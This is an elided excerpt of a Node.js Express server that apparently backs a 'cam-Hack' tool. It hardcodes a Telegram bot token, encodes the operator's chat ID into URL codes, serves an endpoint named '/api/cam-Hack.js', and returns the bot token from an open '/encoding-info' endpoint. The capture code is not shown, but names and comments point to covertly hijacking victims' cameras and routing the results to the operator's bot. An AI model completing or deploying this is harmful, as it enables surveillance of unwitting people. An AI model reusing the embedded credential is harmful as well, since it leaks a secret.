...
// HARD-CODED BOT TOKEN (Your bot only)
const HARDCODED_BOT_TOKEN = '8046839649:AAH7wNQGWdwLb2wGu9tfVZfu203B273fcZk';

// RANDOM ENCODING KEYS (0-10) - Different for each deployment
const ENCODING_KEYS = {
  ...
  'S': 7, 'T': 2, 'U': 9, 'V': 1, 'W': 5, 'X': 8, 'Y': 0, 'Z': 3
};
...
function decodeChatId(encodedStr) {
  ...
  for (let char of encodedStr) {
    if (ENCODING_KEYS[char] !== undefined) {
      ...
      chatId += char; // Keep numbers as is
    }
...
app.get('/api/cam-Hack.js', (req, res) => {
  ...
  if (!code) {
    return res.status(400).json({ 
      ...
      description: 'Encode your chat ID using letters/numbers to generate the code'
    });
  }
...
app.get('/', (req, res) => {
  res.json({ 
    ...
    note: 'Bot token is hardcoded, only chat ID needs to be encoded in the URL',
    encoding_info: 'Letters are randomly mapped to numbers 0-10 for security'
  });
});
...
// Encoding info endpoint (for your reference)
app.get('/encoding-info', (req, res) => {
  res.json({
    encoding_keys: ENCODING_KEYS,
    hardcoded_bot_token: '8046839649:AAH7wNQGWdwLb2wGu9tfVZfu203B273fcZk',
    note: 'This is for admin reference only'
  });
});
...
app.listen(PORT, () => {
  ...
  console.log(`🔒 Bot Token: Hardcoded to your bot only`);
  console.log(`🔑 Encoding Keys: 11 random numbers (0-10) for letters`);
});
